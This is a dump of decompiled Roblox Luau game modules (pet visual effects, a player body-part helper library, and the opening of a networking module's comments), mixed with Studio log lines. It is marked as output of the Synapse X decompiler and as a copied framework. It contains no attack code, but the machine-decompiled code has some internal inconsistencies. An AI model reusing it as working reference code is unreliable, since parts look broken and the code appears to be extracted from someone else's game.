		v195 = v194
		v196 = nil
	else
		v196 = Functions.Scaler(nil, function(p197)
			return not p197:GetAttribute("NoScale")
		end)
		assert(v196)
		v196(Directory1, v195)
	end
	debug.profileend()
	return {
		["id"] = p110.id, 
		["uid"] = p110.uid, 
		["golden"] = v116, 
		["rainbow"] = v117, 
		["darkMatter"] = v118, 
		["shiny"] = v120, 
		["hardcore"] = v119, 
		["world"] = v114, 
		["owner"] = p111, 
		["part"] = Directory1, 
		--["mesh"] = v131, 
		["meshes"] = v132, 
		["parralax"] = v658,
		["childParts"] = v129, 
		["scriptedWelds"] = v184, 
		["center"] = v135, 
		["bottom"] = v136, 
		["mount"] = v137, 
		["mountCharacter"] = v138, 
		["rainbowParticles"] = v151, 
		["rainbowDecals"] = v150, 
		["hardcoreDecals"] = v176, 
		["specialType"] = v180, 
		["billboard"] = v182, 
		["signedAnimation"] = v181, 
		["scale"] = v195, 
		["overrideScale"] = v141, 
		["scaler"] = v196, 
		["moving"] = false, 
		["farming"] = false, 
		["movingTick"] = 0, 
		["spinTick"] = 0, 
		["jumping"] = false, 
		["riding"] = false
	}
end
function PetCmds.BasketballBounce(p198, p199, p200, p201)
	local v202 = p198 % p199
	return (p200 - v202) * math.exp(-v202) * math.abs((math.sin(math.pi * p201 * p198)))
end 
function processParalax(p47, p48, p49, p50, p51)
	--warn('parlax | ', p47, p48, p49, p50, p51)
	local v1113 = p47.Size
	if p51 then
		local v1115 = p51[p47]
		if not v1115 then
			v1115 = p47.CFrame
		end
		for v1185, v1124 in ipairs(p48) do  
			local v1188 = v1124.instance
			local v1130 = v1124.fixedOffset
			local v1135 = Functions.FaceSize(v1124.face, v1113) 
			local v1137 = ((workspace.CurrentCamera.CFrame:Inverse()) * v1115) * (v1124.faceNormal) * (v1113) * 0.5
			v1137 = (v1137) * v1124.linearSpeed
			v1137 = v1137 / (v1124.onexCameraFix*2) --/3--p47.--3
			local v1191 = 1 + (math.log10((-v1124.nearPlaneZ) / math.min(-0.1, v1137.Z))) * v1124.logScale
			local v1148 = Vector3.new(v1137.X, -v1137.Y, 0)
			local v1150 = v1124.animPos
			v1150 = v1150 + ((v1124.animSpeed) * v1148.Unit) * p49
			v1124.animPos = v1150
			local v1197 = (v1148) * v1124.cameraDirection
			local v1198 = Vector3.zero
			local v1204 = (v1197 + v1150) * v1191 - (v1135) * 0.5 + (v1130) * v1135
			local v1207 = ((v1135) * v1191) * v1124.fixedScale
			v1188.OffsetStudsU = v1204.X
			v1188.OffsetStudsV = v1204.Y
			v1188.StudsPerTileU = v1207.X
			v1188.StudsPerTileV = v1207.Y
			local v1217 = ((v1197) * v1124.noiseCameraRatio + v1150) * v1191 - (v1135) * 0.5 + (v1130) * v1135
			local v1218 = v1124.transparencyNoiseRange
			if v1218 then
				local v1220 = 1 - v1124.transparency
				v1188.Transparency = math.clamp(1 - Functions.Lerp(v1218[1], v1218[2], (math.noise(v1217.X, v1217.Y, v1217.Z) + 1) * 0.5), 0, 1)
			end
			local brightnessNoiseRange = v1124.brightnessNoiseRange
			local brightness = Vector3.one
			if brightnessNoiseRange then
				brightness = v1124.brightness * brightnessNoiseRange[1]:Lerp(brightnessNoiseRange[2], (math.noise(-v1217.X, -v1217.Y, -v1217.Z) + 1) * 0.5)
			end 
			--local color = ((v1124.tickColor) * (v1124.color + v1124.brightness))
			local color = (v1124.tickColor * v1124.color) * brightness
			--color = color/2
			v1188.Color3 = Color3.new(color.X, color.Y, color.Z) 
		end
	end
end 
function PetCmds.Effects(p_u_203, p204, p205, p206, p207, p57)
	-- upvalues: (copy) Directory, (copy) v_u_2, (copy) rng, (copy) Audio, (copy) Variables, (copy) v_u_9, (copy) Functions, (copy) v_u_1, (copy) GUIFX
	debug.profilebegin("PetCmds.Effects")
	local v208 = Directory.Pets[p_u_203.id]
	assert(v208)
	local v_u_209 = p_u_203.part
	local v210 = Vector3.one
	local v211 = p_u_203.world == "Void"
	local v212 = p_u_203.walkSoundTick or p205
	p_u_203.walkSoundTick = v212
	local v213 = v211 and 0.65 or 0.3
	local v214 = 1
	if v211 then
		v214 = v214 * 0.4090909090909091
	end
	if v208.balloon then
		v214 = v214 * 0.5
	end
	if v208.jelly then
		v214 = v214 * 0.5
	end
	if p_u_203.moving and not v208.fly and not p_u_203.jumping and p_u_203.movingTick % v213 / v214 <= 0.1 and 0.2 < p205 - v212 then
		p_u_203.walkSoundTick = p205
		local v215 = v208.sounds.walk or WalkSounds
		if 0 < #v215 then
			local rng6 = v215[math.random(1, #v215)]
			local rng7 = rng:NextNumber(0.95, 1.2)
			local rng8 = 0.01
			if p_u_203.riding then
				rng7 = rng7 * 0.75
				rng8 = rng8 * 5
			end
			task.spawn(function()
				-- upvalues: (ref) Audio, (copy) rng6, (copy) v_u_209, (ref) rng7, (ref) rng8
				Audio.Play(rng6, v_u_209, rng7, rng8, 60)
			end)
		end
	end
	local v219 = p_u_203.randomSoundTick or p205
	p_u_203.randomSoundTick = v219
	if not p_u_203.moving and rng:NextNumber() <= 0.001 and 6 <= p205 - v219 and Variables.PetSoundsEnabled then
		p_u_203.randomSoundTick = p205
		local v220 = v208.sounds.random
		if 0 < #v220 then
			local v_u_221 = v220[math.random(1, #v220)]
			task.spawn(function()
				-- upvalues: (ref) Audio, (copy) v_u_221, (copy) v_u_209
				Audio.Play(v_u_221, v_u_209, 1, 0.5, 140)
			end)
		end
	end
	local v222 = p_u_203.specialType
	if v222 and v222 == "Pixel" and p_u_203.moving and not v208.fly and rng:NextInteger(1, 10) == 1 then
		(function()
			-- upvalues: (ref) rng, (copy) v_u_209, (copy) p_u_203, (ref) v_u_9, (ref) Functions
			debug.profilebegin("Pets.Tick.MakeCube")
			local v223 = Instance.new("Part")
			v223.Anchored = true
			v223.Massless = true
			v223.CanCollide = false
			v223.CastShadow = false
			v223.Size = Vector3.one * rng:NextNumber(0.4, 0.66)
			v223.Color = Color3.fromRGB(255, 255, 255)
			v223.CFrame = v_u_209.CFrame + Vector3.new(rng:NextNumber(-1, 1), p_u_203.bottom.CFrame.Y + rng:NextNumber(-1, 1), rng:NextNumber(-1, 1))
			v223.Name = "pixelFX"
			v223.Parent = debris
			local v224 = rng:NextNumber(0.33, 0.6)
			Functions.Tween(v223, {
				["Size"] = v223.Size * rng:NextNumber(0.25, 0.4), 
				["CFrame"] = v223.CFrame * CFrame.new(0, 0, rng:NextNumber(1, 2)) + Vector3.new(0, rng:NextNumber(0.25, 1.5), 0)
			}, { v224, "Linear" })
			Functions.AddDebris(v223, v224)
			debug.profileend()
		end)()
	end
	for v1375, v1368 in pairs(p_u_203.parralax) do
		for v1374, v1373 in ipairs(v1368) do
			v1373.tickColor = Vector3.one
		end
	end
	if p_u_203.rainbow then
		local _ = p_u_203.highlight
		local v225 = Color3.fromHSV(p205 / 1.5 % 1, 1, 1)
		local v226 = ColorSequence.new(v225)
		for _, v227 in ipairs(p_u_203.rainbowParticles) do
			v227.Color = v226
		end
		for _, v228 in ipairs(p_u_203.rainbowDecals) do
			v228.Color3 = v225
		end
		for v1371, v1374 in pairs(p_u_203.parralax) do
			for v1395, v1394 in ipairs(v1374) do 
				v1394.tickColor = (v1394.tickColor) * Functions.ColorToVec(v225)
			end
		end
	end
	if p_u_203.darkMatter then
		local v229 = math.sin(p205)
		if p_u_203.hardcore then
			local v230 = 0.8 + v229 * 0.2
			local vvvv = Vector3.new(v230, 13 + 7 * v229, 15 + 5 * v229)
			for _, v231 in ipairs(p_u_203.meshes) do
				v231.VertexColor = vvvv
			end
			for v1370, v1371 in pairs(p_u_203.parralax) do
				for v1392, v1395 in ipairs(v1371) do
					v1395.tickColor = (v1395.tickColor) * vvvv
				end
			end
		else
			local v232 = not p_u_203.shiny and 0.6 or 0.75 + math.sin(p205) * 0.2
			local vvvv = Vector3.new(15 + 5 * v229, v232, 13 + 7 * v229)
			for _, v233 in ipairs(p_u_203.meshes) do
				v233.VertexColor = vvvv
			end
			for v1370, v1371 in pairs(p_u_203.parralax) do
				for v1392, v1395 in ipairs(v1371) do
					v1395.tickColor = (v1395.tickColor) * vvvv
				end
			end
		end
	end
	if p_u_203.shiny then
		if p_u_203.golden then
			local v234 = math.sin(p205) * 0.25
			local vvvv = Vector3.new(2.2 + v234, 2.2 + v234, 2.2 + v234)
			for _, v235 in ipairs(p_u_203.meshes) do
				v235.VertexColor = vvvv
			end
			for v1370, v1371 in pairs(p_u_203.parralax) do
				for v1392, v1395 in ipairs(v1371) do
					v1395.tickColor = (v1395.tickColor) * vvvv
				end
			end
		elseif not (p_u_203.golden or p_u_203.rainbow or p_u_203.darkMatter) then
			local v236 = math.sin(p205) * 0.2
			local vvvv = Vector3.new(1.8 + v236, 1.8 + v236, 1.8 + v236)
			for _, v237 in ipairs(p_u_203.meshes) do
				v237.VertexColor = vvvv
			end
			for v1370, v1371 in pairs(p_u_203.parralax) do
				for v1392, v1395 in ipairs(v1371) do
					v1395.tickColor = (v1395.tickColor) * vvvv
				end
			end
		end
	end
	for v1441, v1439 in pairs(p_u_203.parralax) do
		if not p_u_203.golden then
			processParalax(v1441, v1439, p206, p207, p57)
		end	
	end
	if p_u_203.hardcore then
		local v238 = math.sin(p205 * 5) * 0.2 + 0.8
		for _, v239 in ipairs(p_u_203.hardcoreDecals) do
			v239.Transparency = v238
		end 
	end
	if v208.christmasLights then
		local v240 = math.floor(p205) % 2 == 0
		local v241 = v_u_209:FindFirstChild("LightsA")
		local v242 = v_u_209:FindFirstChild("LightsB")
		local v243, v244
		if p_u_203.golden then
			v243 = v240 and Color3.fromRGB(255, 255, 0) or Color3.fromRGB(255, 255, 255)
			v244 = v240 and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(255, 255, 0)
		elseif p_u_203.darkMatter then
			v243 = v240 and Color3.fromRGB(255, 255, 0) or Color3.fromRGB(255, 255, 255)
			v244 = v240 and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(255, 255, 0)
		else
			v243 = v240 and Color3.fromRGB(126, 255, 0) or Color3.fromRGB(255, 44, 26)
			v244 = v240 and Color3.fromRGB(255, 44, 26) or Color3.fromRGB(126, 255, 0)
		end
		v241.Color = v243
		v242.Color = v244
	end
	if p_u_203.id == "402" then
		local v245 = v_u_209:FindFirstChild("Back")
		if v245 and v245:IsA("Attachment") then
			local v246 = v245:FindFirstChild("Sparkles")
			if v246 and v246:IsA("ParticleEmitter") then
				v246.Enabled = p_u_203.moving
			end
		end
	end
	if v208.balloon then
		local v247 = v208.balloonScale or Vector3.one
		v210 = v210 * (v247 * Functions.Lerp(0.95, 1.05, (1 + math.sin(p205 * (v208.flySpeed or 1) * (v208.balloonSpeed or 1) * 4)) / 2) + Vector3.one - v247)
	end
	if v208.jelly then
		local v248 = (0.87535218700542) * 2 --5.5 / 2 * math.pi * 2
		local v249, v250 =  0, 0.025
		if p_u_203.moving or p_u_203.farming then  
			v249 = 1
			v250 = 0.14285714285714 
		end
		local v251 = 1 - math.pow(1 - v250, p206 * 60)
		local v252 = (p_u_203.jellyMoving or v249) * (1 - v251) + v249 * v251
		p_u_203.jellyMoving = v252
		local v253 = (p_u_203.jellyTick or 0) + p206 * (0.3 * (1 - v252) + v248 * v252)
		p_u_203.jellyTick = v253
		local v254 = 1 * (1 - v252) + 1.25 * v252
		local v255 = 2 * math.pi * v253
		local v256 = Functions.Map(math.sin(v255 + math.pi / 4), -1, 1, 0.9, 1.1) * v254
		v210 = v210 * Vector3.new(v256, Functions.Map(math.sin(v255), -1, 1, 0.8, 1.2) * v254, v256)
	end
	if p_u_203.id == "988" or p_u_203.id == "989" then
		local v257 = { "rbxassetid://13560436163", "rbxassetid://13560436029", "rbxassetid://13560435915" }
		if p_u_203.mesh.TextureId == "rbxassetid://13560728786" and math.random() < 0.01 then
			p_u_203.mesh.TextureId = v257[math.random(1, #v257)]
			task.delay(0.1, function()
				-- upvalues: (copy) p_u_203
				if p_u_203 and p_u_203.part.Parent and p_u_203.mesh then
					p_u_203.mesh.TextureId = "rbxassetid://13560728786"
				end
			end)
		end
	end
	local v258 = v210 * p_u_203.overrideScale
	if p_u_203.scale ~= v258 then
		p_u_203.scale = v258
		local v259 = p_u_203.scaler
		if not v259 then
			v259 = Functions.Scaler(nil, function(p260)
				local noscale = p260:GetAttribute("NoScale")
				return not noscale
			end)
			p_u_203.scaler = v259
		end
		assert(v259)
		v259(v_u_209, v258)
	end
	if p207 then
		for _, v261 in pairs(p_u_203.scriptedWelds) do
			local v262 = v261.part
			local v263 = v261.offset
			if v261.scaling then
				v263 = v263 - v263.Position + v263.Position * p_u_203.scale
			end
			local v264 = v261.rotationRate
			if v264 then
				local v265 = v264 * p205
				v263 = v263 * CFrame.fromOrientation(v265.X, v265.Y, v265.Z)
			end
			if p_u_203.id == "606" or p_u_203.id == "2148" then
				if v262.Name == "Basketball" then
					v263 = v263 + Vector3.new(0, PetCmds.BasketballBounce(p205, 3, p_u_203.id == "606" and 2 or 5, 2), 0) * p_u_203.scale
				end
			end
			if p_u_203.id == "630" or p_u_203.id == "631" then
				if v262.Name == "Beachball" then
					v263 = v263 + Vector3.new(0, PetCmds.BasketballBounce(p205, 3, (p_u_203.id == "630" or p_u_203.id == "631") and 2 or 5, 2), 0) * p_u_203.scale
				end
			end
			v262:PivotTo((v261.root:GetPivot():ToWorldSpace(v263)))
		end
	end
	if v208.flipbookAnimationSpeed then
		local v52 = p57.golden and v208.flipbookAnimationGold or v208.flipbookAnimation;
		assert(v52);
		local v53 = v52[(math.floor(p57 / v208.flipbookAnimationSpeed) - 1) % #v52 + 1];
		local t_mesh = p57.mesh;
		if t_mesh.TextureId ~= v53 then
			t_mesh.TextureId = v53;
		end
	end
	local v269 = p_u_203.billboard
	if v269 and p204 then
		if not p_u_203.nicknameUpdateTick or p_u_203.nicknameUpdateTick <= p205 then
			v269.Nickname.Text = p204.nk or ""
			p_u_203.nicknameUpdateTick = p205 + 2 + 2 * math.random()
		end
		if p204.snk and not p_u_203.signedAnimation then
			p_u_203.signedAnimation = GUIFX.Rainbow(v269.Nickname, "TextColor3", 3)
		elseif not p204.snk and p_u_203.signedAnimation then
			p_u_203.signedAnimation()
			p_u_203.signedAnimation = nil
			v269.Nickname.TextColor3 = Color3.new(1, 1, 1)
		end
	end
	debug.profileend()
end

return PetCmds
  -  Editar
  04:54:13.763    -  Editar
  04:54:13.763  ----- [2319] ReplicatedStorage.Library.Player -----  -  Editar
  04:54:13.763  -- Decompiled with the Synapse X Luau decompiler.

local v1 = {
	Optional = {}
};
local l__Players__1 = game:GetService("Players");
function v1.Player(p1)
	return p1 or l__Players__1.LocalPlayer;
end;
v1.Optional.Character = function(p2)
	return v1.Player(p2).Character;
end;
function v1.Character(p3)
	local v2 = v1.Player(p3);
	return v2.Character or v2.CharacterAdded:Wait();
end;
v1.Optional.PrimaryPart = function(p4)
	local v3 = v1.Optional.Character(p4);
	return v3 and v3.PrimaryPart;
end;
function v1.PrimaryPart(p5)
	local v4 = v1.Character(p5);
	local l__PrimaryPart__5 = v4.PrimaryPart;
	if l__PrimaryPart__5 then
		return l__PrimaryPart__5;
	end;
	v4:WaitForChild("HumanoidRootPart", math.huge);
	local l__PrimaryPart__6 = v4.PrimaryPart;
	assert(l__PrimaryPart__6);
	return l__PrimaryPart__6;
end;
v1.Optional.Humanoid = function(p6)
	local v7 = v1.Optional.Character(p6);
	return v7 and v7:FindFirstChildOfClass("Humanoid");
end;
function v1.Humanoid(p7)
	local v8 = v1.Character(p7);
	local v9 = v8:FindFirstChildOfClass("Humanoid");
	if v9 then
		return v9;
	end;
	v8:WaitForChild("Humanoid", math.huge);
	local v10 = v8:FindFirstChildOfClass("Humanoid");
	assert(v10);
	return v10;
end;
v1.Optional.Part = function(p8, p9)
	return v1.Character(p8):FindFirstChild(p9);
end;
function v1.Part(p10, p11)
	return v1.Character(p10):WaitForChild(p11, math.huge);
end;
v1.Optional.EmbeddedPart = function(p12, p13, p14)
	local v11 = v1.Optional.Part(p12, p13);
	return v11 and v11:FindFirstChild(p14);
end;
function v1.EmbeddedPart(p15, p16, p17)
	return v1.Part(p15, p16):WaitForChild(p17, math.huge);
end;
v1.Optional.Head = function(p18)
	return v1.Optional.Part(p18, "Head");
end;
function v1.Head(p19)
	return v1.Part(p19, "Head");
end;
v1.Optional.UpperTorso = function(p20)
	return v1.Optional.Part(p20, "UpperTorso");
end;
function v1.UpperTorso(p21)
	return v1.Part(p21, "UpperTorso");
end;
v1.Optional.LowerTorso = function(p22)
	return v1.Optional.Part(p22, "LowerTorso");
end;
function v1.LowerTorso(p23)
	return v1.Part(p23, "LowerTorso");
end;
v1.Optional.LeftFoot = function(p24)
	return v1.Optional.Part(p24, "LeftFoot");
end;
function v1.LeftFoot(p25)
	return v1.Part(p25, "LeftFoot");
end;
v1.Optional.LeftHand = function(p26)
	return v1.Optional.Part(p26, "LeftHand");
end;
function v1.LeftHand(p27)
	return v1.Part(p27, "LeftHand");
end;
v1.Optional.LeftLowerArm = function(p28)
	return v1.Optional.Part(p28, "LeftLowerArm");
end;
function v1.LeftLowerArm(p29)
	return v1.Part(p29, "LeftLowerArm");
end;
v1.Optional.LeftLowerLeg = function(p30)
	return v1.Optional.Part(p30, "LeftLowerLeg");
end;
function v1.LeftLowerLeg(p31)
	return v1.Part(p31, "LeftLowerLeg");
end;
v1.Optional.LeftUpperArm = function(p32)
	return v1.Optional.Part(p32, "LeftUpperArm");
end;
function v1.LeftUpperArm(p33)
	return v1.Part(p33, "LeftUpperArm");
end;
v1.Optional.LeftUpperLeg = function(p34)
	return v1.Optional.Part(p34, "LeftUpperLeg");
end;
function v1.LeftUpperLeg(p35)
	return v1.Part(p35, "LeftUpperLeg");
end;
v1.Optional.RightFoot = function(p36)
	return v1.Optional.Part(p36, "RightFoot");
end;
function v1.RightFoot(p37)
	return v1.Part(p37, "RightFoot");
end;
v1.Optional.RightHand = function(p38)
	return v1.Optional.Part(p38, "RightHand");
end;
function v1.RightHand(p39)
	return v1.Part(p39, "RightHand");
end;
v1.Optional.RightLowerArm = function(p40)
	return v1.Optional.Part(p40, "RightLowerArm");
end;
function v1.RightLowerArm(p41)
	return v1.Part(p41, "RightLowerArm");
end;
v1.Optional.RightLowerLeg = function(p42)
	return v1.Optional.Part(p42, "RightLowerLeg");
end;
function v1.RightLowerLeg(p43)
	return v1.Part(p43, "RightLowerLeg");
end;
v1.Optional.RightUpperArm = function(p44)
	return v1.Optional.Part(p44, "RightUpperArm");
end;
function v1.RightUpperArm(p45)
	return v1.Part(p45, "RightUpperArm");
end;
v1.Optional.RightUpperLeg = function(p46)
	return v1.Optional.Part(p46, "RightUpperLeg");
end;
function v1.RightUpperLeg(p47)
	return v1.Part(p47, "RightUpperLeg");
end;
v1.Optional.Root = function(p48)
	return v1.Optional.EmbeddedPart(p48, "LowerTorso", "Root");
end;
function v1.Root(p49)
	return v1.EmbeddedPart(p49, "LowerTorso", "Root");
end;
v1.Optional.Waist = function(p50)
	return v1.Optional.EmbeddedPart(p50, "UpperTorso", "Waist");
end;
function v1.Waist(p51)
	return v1.EmbeddedPart(p51, "UpperTorso", "Waist");
end;
v1.Optional.Neck = function(p52)
	return v1.Optional.EmbeddedPart(p52, "Head", "Neck");
end;
function v1.Neck(p53)
	return v1.EmbeddedPart(p53, "Head", "Neck");
end;
v1.Optional.LeftAnkle = function(p54)
	return v1.Optional.EmbeddedPart(p54, "LeftFoot", "LeftAnkle");
end;
function v1.LeftAnkle(p55)
	return v1.EmbeddedPart(p55, "LeftFoot", "LeftAnkle");
end;
v1.Optional.LeftWrist = function(p56)
	return v1.Optional.EmbeddedPart(p56, "LeftHand", "LeftWrist");
end;
function v1.LeftWrist(p57)
	return v1.EmbeddedPart(p57, "LeftHand", "LeftWrist");
end;
v1.Optional.LeftElbow = function(p58)
	return v1.Optional.EmbeddedPart(p58, "LeftLowerArm", "LeftElbow");
end;
function v1.LeftElbow(p59)
	return v1.EmbeddedPart(p59, "LeftLowerArm", "LeftElbow");
end;
v1.Optional.LeftKnee = function(p60)
	return v1.Optional.EmbeddedPart(p60, "LeftLowerLeg", "LeftKnee");
end;
function v1.LeftKnee(p61)
	return v1.EmbeddedPart(p61, "LeftLowerLeg", "LeftKnee");
end;
v1.Optional.LeftShoulder = function(p62)
	return v1.Optional.EmbeddedPart(p62, "LeftUpperArm", "LeftShoulder");
end;
function v1.LeftShoulder(p63)
	return v1.EmbeddedPart(p63, "LeftUpperArm", "LeftShoulder");
end;
v1.Optional.LeftHip = function(p64)
	return v1.Optional.EmbeddedPart(p64, "LeftUpperLeg", "LeftHip");
end;
function v1.LeftHip(p65)
	return v1.EmbeddedPart(p65, "LeftUpperLeg", "LeftHip");
end;
v1.Optional.RightAnkle = function(p66)
	return v1.Optional.EmbeddedPart(p66, "RightFoot", "RightAnkle");
end;
function v1.RightAnkle(p67)
	return v1.EmbeddedPart(p67, "RightFoot", "RightAnkle");
end;
v1.Optional.RightWrist = function(p68)
	return v1.Optional.EmbeddedPart(p68, "RightHand", "RightWrist");
end;
function v1.RightWrist(p69)
	return v1.EmbeddedPart(p69, "RightHand", "RightWrist");
end;
v1.Optional.RightElbow = function(p70)
	return v1.Optional.EmbeddedPart(p70, "RightLowerArm", "RightElbow");
end;
function v1.RightElbow(p71)
	return v1.EmbeddedPart(p71, "RightLowerArm", "RightElbow");
end;
v1.Optional.RightKnee = function(p72)
	return v1.Optional.EmbeddedPart(p72, "RightLowerLeg", "RightKnee");
end;
function v1.RightKnee(p73)
	return v1.EmbeddedPart(p73, "RightLowerLeg", "RightKnee");
end;
v1.Optional.RightShoulder = function(p74)
	return v1.Optional.EmbeddedPart(p74, "RightUpperArm", "RightShoulder");
end;
function v1.RightShoulder(p75)
	return v1.EmbeddedPart(p75, "RightUpperArm", "RightShoulder");
end;
v1.Optional.RightHip = function(p76)
	return v1.Optional.EmbeddedPart(p76, "RightUpperLeg", "RightHip");
end;
function v1.RightHip(p77)
	return v1.EmbeddedPart(p77, "RightUpperLeg", "RightHip");
end;
v1.Optional.PlayerGui = function(p78)
	return v1.Player(p78):FindFirstChild("PlayerGui");
end;
function v1.PlayerGui(p79)
	return v1.Player(p79):WaitForChild("PlayerGui", math.huge);
end;
function v1.Mouse(p80)
	return v1.Player(p80):GetMouse();
end;
function v1.Camera(p81)
	return workspace.CurrentCamera;
end;
function v1.Name(p82)
	return v1.Player(p82).Name;
end;
function v1.DisplayName(p83)
	return v1.Player(p83).DisplayName;
end;
v1.Optional.Animator = function(p84)
	local v12 = v1.Optional.Humanoid(p84);
	if not v12 then
		return nil;
	end;
	local v13 = v12:FindFirstChildOfClass("Animator");
	if v13 then
		return v13;
	end;
	local v14 = v12:FindFirstChildOfClass("AnimationController");
	if v14 then
		return v14;
	end;
	return v12;
end;
function v1.Animator(p85)
	local v15 = v1.Humanoid(p85);
	local v16 = v15:FindFirstChildOfClass("Animator");
	if v16 then
		return v16;
	end;
	local v17 = v15:FindFirstChildOfClass("AnimationController");
	if v17 then
		return v17;
	end;
	return v15;
end;
return v1;
  -  Editar
  04:54:13.763    -  Editar
  04:54:13.763  ----- [2320] ReplicatedStorage.Library.Network -----  -  Editar
  04:54:13.763  --[[    
                                                                   ,,╓╓╖╖╥╥@@@,,,╓╖╖╖
                                                            ,,╓╓╖╖╖@@@╢╢║╢╢╣▒▒▒▒▒▒▒▒▒
                                          ,,,╓╖╖╖╥@@@╢╢╢╢╢▒▒▒╢╢╜╜╙````"╙╜╢╣▒▒▒▒▒▒▒▒▒▒
                         ,,,╓╖╖╥@@@@╢║╢╢▒▒╢╢╢Ñ╨╨╨▒▒▒▒▒▒▒▒▒╢╜`              ╙╢▒▒▒▒▒▒▒▒
        ,,╓╖╖╖╥@@@╢╢╢╢╢▒▒╢╢╢╢╢╢╢▒▒▒▒▒▒▒▒▒▒       ╢▒▒▒▒▒▒▒╜                   ╙╢▒▒▒▒▒▒
        ]▒▒▒▒▒╜╜╙"``              ╙╢▒▒▒▒▒▒░      ║▒▒▒▒▒▒╜       ╥@╣╢╢@╖       ,╢▒▒▒▒▒▒
         ▒▒▒▒▒L                     ╙╢▒▒▒▒▒      ]▒▒▒▒▒▒      ,╣▒▒▒▒▒▒▒╢╖,╓@╣╢▒▒▒▒▒▒▒▒
         ║▒▒▒▒▒        ,,,╓╓╓,       ]▒▒▒▒╣       ╢▒▒▒▒       ║▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒▒       ╢▒▒▒▒▒▒▒@       ▒▒▒▒▒       ║▒▒▒▒       ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ]▒▒▒▒▒       ║▒▒▒▒▒▒▒Ñ      ,▒▒▒▒▒▒      ]▒▒▒▒       ╢▒▒▒▒▒╜╜╜╙"``     └▒▒▒▒▒▒s
          ▒▒▒▒▒▒      ╙╝╨╜╜╜╙       ╓╢▒▒▒▒▒▒      └▒▒▒▒       ║▒▒▒▒▒             ╢▒▒▒▒▒
          ║▒▒▒▒▒                   ╙╨╢▒▒▒▒▒╢       ║▒▒▒H      ╙▒▒▒▒▒▒            ║▒▒▒▒▒░
          ]▒▒▒▒▒                      ╙╢▒▒▒▒       ║▒▒▒╢       ║▒▒▒▒╢@@@╣╢C      ]▒▒▒▒▒▒
           ▒▒▒▒▒~      ╓╖╥@@@@@@,      `╢▒▒▒▒      ]▒▒▒▒H       ╙╣▒▒▒▒▒▒▒╜        ▒▒▒▒▒▒
           ║▒▒▒▒▒      ]▒▒▒▒▒▒▒▒▒∩      ║▒▒▒╣       ▒▒▒▒▒╖        ╙╨╝╝╜╜          ║▒▒▒▒▒
           ║▒▒▒▒╣       ╢▒▒▒▒▒▒▒▒░      ]▒▒▒▒       ║▒▒▒▒▒Ñ                       ╠▒▒▒▒▒∩
           └▒▒▒▒▒       ║▒▒╢╢╢╝╜`       ║▒▒▒▒▒      ]▒▒▒▒▒▒▒@╖             ╓╣.,,,╓║▒▒▒▒▒▒
            ╢▒▒▒▒▒                     ║▒▒▒▒▒▒      └▒▒▒▒▒▒▒▒▒╣╢@╥╖╖╖╖╖@@╢▒▒▒▒▒╢╢╢╝╨╜╜╜╙"
            ║▒▒▒▒▒                  ╓@╢▒▒▒▒▒▒▒╖╓╖╖╥@@▒▒▒▒▒▒▒▒▒╢╢╢╨╜╜╜╜╙╙``
            ]▒▒▒▒▒        ,,,╓╓╖@@╣╢▒▒▒▒▒▒▒▒▒╢║╨╨╜╜╜╙╙"``        ,,╓╓╖╥╗   ,@╢▒▒▒╣╣╗
             ▒▒▒▒▒Ñ@╣╢╢╣▒▒▒╢╢║╨╨╜╜╜╙╙`'        ,,,╓╖,    ║╣╢   ╢▒▒▒▒▒▒╢╢H ╓▒▒╢╙``╙╨Ñ
             ╨╜╜╜╜╙"``            ╓╥@@@╥╖    ║▒▒▒▒▒▒▒▒N  ║▒▒[  ║▒▒U       ]▒▒╢╖,,
                     ╓╣╢▒▒╢╣╖   ╓╢▒▒Ñ╨╣▒▒╢,  ║▒▒[   ║▒▒H ]▒▒╢  ]▒▒║╖╖╥╗╖   ╙╢▒▒▒▒▒╣╣╖
                    ╢▒▒╜""╙▒▒Ñ  ╢▒▒     ╢▒╣  ]▒▒▒   ║▒▒▒  ▒▒▒   ▒▒▒╢╢Ñ╝╨       `"╙╢▒▒H
                   ]▒▒▒    `    ▒▒▒     ╠▒▒[  ▒▒▒╢╣▒▒▒╝   ║▒▒∩  ║▒▒        ╓╣╖,,,╓╢▒▒`
                   ║▒▒▒         ╢▒▒     ]▒▒[  ║▒▒╜``      ]▒▒▒  ]▒▒N@@Ñ╣╣╢ ╙╢▒▒▒▒▒▒Ñ`
                   └▒▒╢     ╖╖, ╙▒▒╢    ║▒▒┘  ║▒▒▒         ▒▒╢  ]╢╢╢╝╝╨╜╜╙
                    ╙▒▒╣╖,,╥▒▒Ñ  ╙╢▒▒╢╢▒▒╢╜   └╢╢▒
                     ╙╢▒▒▒▒▒╢╜      ╙╜
                                 

	BIG Copies rbx.lua Framework [2023] - [2023]
	Written by OneX - 1037898275229020250
	Developed with a keyboard and pixie dust.
	
	-+-+-+- SPECIFICS -+-+-+-
	_L.Network
	===========
	Handles all the networking from client to server. Automatically compresses strings and tables to save bandwidth (theoretical)
	Makes networking completely automatic and somehow also makes the syntax simplier. No fiddling with remotes required. B)
	
	Event example:
		CLIENT:
		_L.Network.Fire("Bullet Fired", bullet.CFrame, bullet, {speed = 33, damage = 423})
		
		SERVER:
		_L.Network.Fired("Bullet Fired"):Connect(function(player, ...)
			FireBullet(player, ...)
		end)
	
	Function example:
		CLIENT:
		local success = _L.Network.Invoke("Buy", "Super Soaker 5000", 2455)
		
		SERVER:
		_L.Network.Invoked("Buy").OnInvoke = function(player, itemName, price)
			return (price <= 3000)
		end
		
	===========
		\\\ Subsititute for RemoteEvent:FireServer() / RemoteEvent:FireClient()
		Network.Fire(
			remoteName,				<--	|REQ|	Remote name											
			player,					<-- |REQ|	Player instance	(SERVER ONLY)								
			...,					<-- 		Anything :)							
		)
	
		\\\ Subsititute for RemoteFunction:InvokeClient() / RemoteFunction:InvokeServer()
		Network.Invoke(
			remoteName,				<--	|REQ|	Remote name											
			player,					<-- |REQ|	Player instance	(SERVER ONLY)								
			...,					<-- 		Anything :)							
		)

		\\\ Subsititute for RemoteEvent.OnClientEvent / RemoteEvent.OnServerEvent
		Network.Fired(
			remoteName,				<--	|REQ|	Remote name			
		)
		
		\\\ Subsititute for RemoteFunction.OnClientInvoke / RemoteFunction.OnServerInvoke
		Network.Invoked.OnInvoke(
			remoteName,				<--	|REQ|	Remote name			
		)
		
		\\\ Subsititute for RemoteEvent:FireAllClients()
		Network.FireAll(
